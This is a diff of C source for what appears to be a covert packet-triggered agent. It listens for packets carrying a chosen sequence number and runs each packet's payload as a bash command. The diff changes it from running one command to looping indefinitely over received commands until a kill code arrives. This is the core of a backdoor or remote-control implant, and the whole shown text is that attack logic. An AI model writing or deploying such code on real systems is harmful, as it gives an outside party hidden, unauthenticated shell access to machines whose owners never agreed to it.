@@ -34,17 +34,24 @@ int StartAgent()
     }
     printf("Filtering packets for sequence number: %u\n", config->sequence_number);
 
-    if (AcceptPacket(sock, &packet_data))
+    while (AcceptPacket(sock, &packet_data) != EXIT_KILL_SERVER)
     {
-        (void)fprintf(stderr, "Failed to accept packet\n");
-        goto end;
+        if (NULL == packet_data)
+        {
+            (void)fprintf(stderr, "Failed to accept packet\n");
+            continue;
+        }
+
+        ret = RunCommand((char*)packet_data);
+        if (EXIT_SUCCESS != ret)
+        {
+            (void)fprintf(stderr, "Command execution failed\n");
+        }
+
+        NFREE(packet_data);
     }
 
-    ret = RunCommand((char*)packet_data);
-    if (EXIT_SUCCESS != ret)
-    {
-        (void)fprintf(stderr, "Command execution failed\n");
-    }
+    exit_code = EXIT_SUCCESS;
 
 end:
     NFREE(packet_data);
@@ -64,7 +71,11 @@ end:
 static int RunCommand(char* cmd)
 {
     int exit_code = EXIT_FAILURE;
-    pid_t pid = fork();
+    pid_t pid = 0;
+
+    printf("Running cmd %s\n", cmd);
+
+    pid = fork();
 
     if (NULL == cmd)
     {
@@ -80,6 +91,7 @@ static int RunCommand(char* cmd)
 
     if (0 == pid)
     {
+
         execl("/bin/bash", "bash", "-c", cmd, (char*)NULL);
         perror("execlp failed");
         exit(EXIT_FAILURE);
